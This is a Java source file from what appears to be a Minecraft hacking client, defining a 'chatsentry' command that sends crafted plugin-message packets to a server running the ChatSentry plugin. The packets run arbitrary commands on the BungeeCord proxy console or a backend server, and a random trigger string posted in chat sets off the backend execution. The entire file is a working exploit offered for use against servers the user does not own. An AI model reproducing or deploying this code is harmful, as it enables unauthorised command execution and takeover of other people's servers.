package io.github.spigotrce.paradiseclientfabric.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import io.github.spigotrce.paradiseclientfabric.packet.ChatSentryPayloadPacket;
import net.fabricmc.fabric.api.client.command.v2.ClientCommandManager;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.minecraft.client.MinecraftClient;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;

import java.util.Random;

public class ChatSentryCommand extends Command {
    public ChatSentryCommand(MinecraftClient minecraftClient) {
        super("chatsentry", "Executes bungee command through console!", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<CommandSource> build() {
        return literal(getName())
                .executes(context -> {
                    Helper.printChatMessage("Incomplete command!");
                    return SINGLE_SUCCESS;
                })
                .then(literal("bungee")
                        .then(argument("command", StringArgumentType.greedyString())
                                .executes(context -> {
                                    Helper.sendPacket(new CustomPayloadC2SPacket(
                                            new ChatSentryPayloadPacket(context.getArgument("command", String.class), true, "", "")
                                    ));
                                    Helper.printChatMessage("Chat sentry bungee payload packet sent!");
                                    return SINGLE_SUCCESS;
                                })
                        ))
                .then(literal("backend")
                        .executes(context -> {
                            Helper.printChatMessage("Incomplete command!");
                            return SINGLE_SUCCESS;
                        })
                        .then(argument("command", StringArgumentType.greedyString())
                                .executes(context -> {
                                    String command = context.getArgument("command", String.class);
                                    new Thread(() -> sendAutoExecution(command)).start();
                                    return SINGLE_SUCCESS;
                                })
                        )
                );

    }

    private void sendAutoExecution(String command) {
        String s = Helper.generateRandomString(4, "iahosd6as5d9oayhdstdou", new Random());
        Helper.sendPacket(new CustomPayloadC2SPacket(
                new ChatSentryPayloadPacket(command, false, "config", s)
        ));

        Helper.sendPacket(new CustomPayloadC2SPacket(
                new ChatSentryPayloadPacket(command, false, "module", s)
        ));
        Helper.printChatMessage("Chat sentry backend payload packet sent! Sending execution message: " + s);
        try {
            Thread.sleep(100);
        } catch (InterruptedException e) {
            Helper.printChatMessage("Unable to sleep for message, send in chat: " + s);
        }
        getMinecraftClient().getNetworkHandler().sendChatMessage(s);
    }
}
